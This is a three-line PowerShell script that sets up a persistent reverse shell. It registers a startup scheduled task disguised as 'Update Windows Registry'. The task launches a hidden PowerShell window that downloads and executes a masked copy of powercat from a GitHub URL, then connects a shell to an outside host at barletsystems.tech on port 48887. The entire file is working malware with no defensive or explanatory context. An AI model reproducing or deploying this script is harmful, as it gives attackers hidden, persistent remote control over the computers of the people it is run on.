$trigger = New-ScheduledTaskTrigger -AtStartup
$action = New-ScheduledTaskAction -Execute "powershell -windowstyle hidden -c IEX(IWR https://raw.githubusercontent.com/simeone22/PowercatMasked/main/powercat.ps1 -UseBasicParsing); PtyS barletsystems.tech 48887"
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "Update Windows Registry"
